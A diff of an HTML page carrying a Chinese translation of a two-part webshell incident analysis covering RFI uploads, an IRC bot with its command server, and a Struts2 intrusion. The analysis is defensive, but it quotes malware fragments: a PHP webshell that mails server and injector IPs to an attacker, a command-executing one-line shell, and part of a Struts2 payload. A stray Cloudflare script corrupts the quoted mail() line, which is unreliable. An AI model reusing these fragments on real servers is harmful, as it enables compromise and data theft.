@@ -3,18 +3,18 @@
 			<head>
 			     <title>Webshell-Part1&Part2 - virustracker</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/papers/12598">http://drops.wooyun.org/papers/12598</a></h1>
 				
       <p>
-        <p><strong>原文链接：</strong><br />
-<a href="https://dfir.it/blog/2015/08/12/webshell-every-time-the-same-purpose/">https://dfir.it/blog/2015/08/12/webshell-every-time-the-same-purpose/</a><br />
+        </p><p><strong>原文链接：</strong><br>
+<a href="https://dfir.it/blog/2015/08/12/webshell-every-time-the-same-purpose/">https://dfir.it/blog/2015/08/12/webshell-every-time-the-same-purpose/</a><br>
 <a href="https://dfir.it/blog/2016/01/18/webshells-every-time-the-same-story-dot-dot-dot-part2/">https://dfir.it/blog/2016/01/18/webshells-every-time-the-same-story-dot-dot-dot-part2/</a></p>
 
 <h1>0x00 前言</h1>
 
-<hr />
+<hr>
 
 <p>众所周知，每时每刻，世界上的web服务器都在遭到成千上万次恶意请求的攻击，攻击形式也是各有不同。今天，我研究的就是其中的一类：webshell。</p>
 
@@ -24,13 +24,13 @@
 
 <h1>0x01 简介-测试开始前</h1>
 
-<hr />
+<hr>
 
 <p>经过多年的发展，互联网有了翻天覆地的变化。web服务器的功能不再局限于简单的呈现个人网站或商业网站。像JavaScript，PHP，Python和Ruby这样的开发语言已经在商业应用，在线商城，网上娱乐，博客等应用方式中扮演了极为重要的角色。由于这些应用方式更多的会使用现成的解决方案，所以也导致了大量的漏洞。谁没有听说过Wordpress或phpBB漏洞利用呢？这类常用的web应用已经成为了攻击者创建僵尸网络或传播木马的主要目标。当出现新的0-day漏洞时，攻击者就会利用这些漏洞，大规模的入侵受害者的机器。他们首先会做的是通过批量扫描来查找漏洞。有些攻击者则会瞄准web服务器，因为web服务器可以说是进入一些内部基础设施的大门。</p>
 
 <h1>0x02 第一幕</h1>
 
-<hr />
+<hr>
 
 <p>我会通过三个例子来说明如何绕过安全措施，成功把webshell上传到目标系统上-包括RFI（远程文件包含漏洞）和SQL命令注入。</p>
 
@@ -88,15 +88,15 @@ function start()
 
 <p>pBot类定义了一个数组，在这个数组中包含有完整的配置信息。或许，你也注意到了server和port字段，这些字段提供了与CC相关的信息。在我们检查irc.malink.biz之前，我想先调查malink.biz域名。通过Passivetotal服务，我们可以看到这个域名的历史记录和Whois信息。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160128/20160128061601107351100.png" alt="p1" /></p>
+<p><img src="../images_result/images/20160128061601107351100.png" alt="p1"></p>
 
 <p>域名信息和所有者数据显示这个域名的主人来自美国？这样的结果符合你对这个可疑域名的预期吗？或许下面的信息能给我们答案...</p>
 
-<p><img src="http://static.wooyun.org//drops/20160128/2016012806160318231260.png" alt="p2" /></p>
+<p><img src="../images_result/images/2016012806160318231260.png" alt="p2"></p>
 
 <p>nothingsecure…OK，这就看起来比较符合逻辑了。IRC提供的信息清楚地显示了这个域名的意图：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160128/2016012806160518900339.png" alt="p3" /></p>
+<p><img src="../images_result/images/2016012806160518900339.png" alt="p3"></p>
 
 <p>接下来，我们看看irc.malink.biz。</p>
 
@@ -111,15 +111,15 @@ irc.malink.biz.       14384    IN    A    167.114.68.120
 
 <p>总的来说，位于巴黎的服务器接收到一条从马德里发来的请求，这条请求要求访问域名sxxxxxxo.no（哥伦布俄亥俄州），并从这个域名上下载一个内嵌了webshell的文件byroe.jpg。在这个文件中，我们发现了一个IRC服务器irc.malink.biz，这个服务器解析到了多个IP上-使用轮询（round-robin）模式来加载剩余的DNS记录（德国，英国，加拿大）。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160128/2016012806160746759437.png" alt="p4" /></p>
+<p><img src="../images_result/images/2016012806160746759437.png" alt="p4"></p>
 
 <p>看起来像什么？</p>
 
 <p>Virustotal的AV检测率还不错。目前来说，分析的第一步，最好不要向VT上传任何文件。首先从OSINT入手。比如，在上传文件之前，首先检查VT数据库中有没有这个文件的哈希。在分享恶意文件时（注意，VT数据库是公开的）很可能就会引起攻击者的注意，而攻击者就有机会采取应对措施了。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160128/2016012806160833684530.png" alt="p5" /></p>
+<p><img src="../images_result/images/2016012806160833684530.png" alt="p5"></p>
 
-<p><img src="http://static.wooyun.org//drops/20160128/2016012806161063661626.png" alt="p6" /></p>
+<p><img src="../images_result/images/2016012806161063661626.png" alt="p6"></p>
 
 <p>攻击者不仅仅会利用图像文件来绕过WAF。</p>
 
@@ -165,7 +165,7 @@ if (!$safem0de) {$security= "SAFE_MODE = OFF";}
 else {$security= "SAFE_MODE = ON";};
 $serper=gethostbyname($_SERVER['SERVER_ADDR']);
 $injektor = gethostbyname($_SERVER['REMOTE_ADDR']);
-mail("<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="681b0d1c071a09065c585c280f05090104460b0705">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>", "$body","Hasil Bajakan http://$web$inj\n$security\nIP Server = $serper\n IP Injector= $injektor");
+mail("<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="681b0d1c071a09065c585c280f05090104460b0705">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>", "$body","Hasil Bajakan http://$web$inj\n$security\nIP Server = $serper\n IP Injector= $injektor");
 $_SESSION['bajak'] = 0;
 }
 else {$_SESSION['bajak']++;};
@@ -228,15 +228,15 @@ echo "&lt;center&gt;&lt;font size=4 color=#FFF5EE&gt;Jayalah &lt;font size=4 col
 
 <p>第一部分代码正在负责向<a href="&#x6d;&#97;&#105;&#x6c;&#116;&#111;&#x3a;&#x73;&#101;&#x74;&#x6f;&#114;&#97;&#x6e;&#52;&#48;&#x34;&#x40;&#103;&#x6d;&#x61;&#105;&#108;&#x2e;&#99;&#111;&#x6d;">&#x73;&#101;&#x74;&#x6f;&#114;&#97;&#x6e;&#52;&#48;&#x34;&#x40;&#103;&#x6d;&#x61;&#105;&#108;&#x2e;&#99;&#111;&#x6d;</a>发送与感染活动相关的确认邮件。随后的这段代码会负责在被感染系统上执行命令，并打印页面上的输出。下面是从网络上找到的“生成”样本：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160128/2016012806161212137725.png" alt="p7" /></p>
+<p><img src="../images_result/images/2016012806161212137725.png" alt="p7"></p>
 
 <p>你可以看到，攻击者上传了几个“插件”，比如Mailer-1.php，Mailer-2.php，1337w0rm.php</p>
 
 <p>我又看了看VirusTotal的AV检测率：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160128/2016012806161346598823.png" alt="p8" /></p>
+<p><img src="../images_result/images/2016012806161346598823.png" alt="p8"></p>
 
-<p><img src="http://static.wooyun.org//drops/20160128/2016012806161553874923.png" alt="p9" /></p>
+<p><img src="../images_result/images/2016012806161553874923.png" alt="p9"></p>
 
 <p>这次不好，大部分AV引擎都无法识别出这个可疑文件。</p>
 
@@ -278,11 +278,11 @@ http://www.vulnerablesite.com/webshell.php?cmd=ls
 
 <p>服务器会返回<code>/var/www</code>的目录列表。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160128/20160128061617754121025.png" alt="p10" /></p>
+<p><img src="../images_result/images/20160128061617754121025.png" alt="p10"></p>
 
 <p>最后，看看VirusTotal怎么查找这个只有一行的wenshell。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160128/20160128061618152751128.png" alt="p11" /></p>
+<p><img src="../images_result/images/20160128061618152751128.png" alt="p11"></p>
 
 <p>很好的隐藏了；</p>
 
@@ -292,19 +292,19 @@ http://www.vulnerablesite.com/webshell.php?cmd=ls
 
 <h1>0x03 第二幕-前言</h1>
 
-<hr />
+<hr>
 
 <p>我们已经说过，每时每刻，世界上大量的黑客正在试图利用各种漏洞。攻击者会通过不同的混淆方式或隐匿技术来投放有效载荷，并通过安装webshell来抢占第一据点。不过，对于防御者而言，还有更大的难题，因为有些目的明确的攻击者会执行网络间谍活动，但是他们的行动更难发现，并且更有针对性。</p>
 
 <h1>0x04 第二幕</h1>
 
-<hr />
+<hr>
 
 <p>下面的这个案例分析引发了我们对基础安全控制，风险和各方责任的广泛讨论。你们当中有很多人可能都经历过漏洞攻击，系统篡改等问题。先把这些问题放到一边，今天，我们讨论的主题是-针对性攻击中的webshell使用。</p>
 
 <p>在调查过程中，最关键的一部分就是找到攻击者的切入点。有一次，运维小组报告了一起影响了大量web服务器的事件，在这次攻击中，我发现攻击者综合利用了自定义后门，rootkit和密码转储工具（注意：没有在本文中讨论）。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160128/20160128061620184581222.png" alt="p12" /></p>
+<p><img src="../images_result/images/20160128061620184581222.png" alt="p12"></p>
 
 <p>通过分析多台机器上遗留下来的木马工具和感染活动发生的时间，我们找到了安装了第一个木马样本的可疑服务器。唯一的问题是，这个人是怎么在内部web服务器上植入第一个恶意文件的呢？事实上，这个木马是用一个应用服务器的服务账户执行的，坏消息是这个账户还有管理员权限。</p>
 
@@ -380,15 +380,15 @@ ET &lt;AppURL&gt;redirectAction:%25
 
 <p>一张图能说明很多问题：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160128/20160128061622743371321.png" alt="p13" /></p>
+<p><img src="../images_result/images/20160128061622743371321.png" alt="p13"></p>
 
 <h1>0x05 总结</h1>
 
-<hr />
+<hr>
 
 <p>这个故事的寓意很简单。那些思维缜密的攻击者经常会在攻击活动的不同阶段来利用webshell这个武器，无论是刚开始入侵受害者的设备，还是要维持木马的存在。更重要的是，防御者和事件响应人员并不是随时都有分析数据。访问日志可能已经被覆盖了，但是每次攻击都会在系统上遗留一些工具。应用日志中都会记录下这些信息，而且人都会犯错的。</p>
 
-<p>Mandiant<a href="https://www.fireeye.com/blog/threat-research/2013/08/responding-attacks-apache-struts2.html">记录了</a>几个月前利用Struts2漏洞实施的webshell攻击活动。CrowdStrike分享了一篇关于HURRICANE PANDA 和 DEEP PANDA的<a href="http://www.crowdstrike.com/blog/adversary-tricks-crowdstrike-treats/">文章</a>，这两次行动利用了China Chopper webshell。这些文章都很值得一读。</p>      </p>
+<p>Mandiant<a href="https://www.fireeye.com/blog/threat-research/2013/08/responding-attacks-apache-struts2.html">记录了</a>几个月前利用Struts2漏洞实施的webshell攻击活动。CrowdStrike分享了一篇关于HURRICANE PANDA 和 DEEP PANDA的<a href="http://www.crowdstrike.com/blog/adversary-tricks-crowdstrike-treats/">文章</a>，这两次行动利用了China Chopper webshell。这些文章都很值得一读。</p>      <p></p>
     
 			</body>
 		</html>
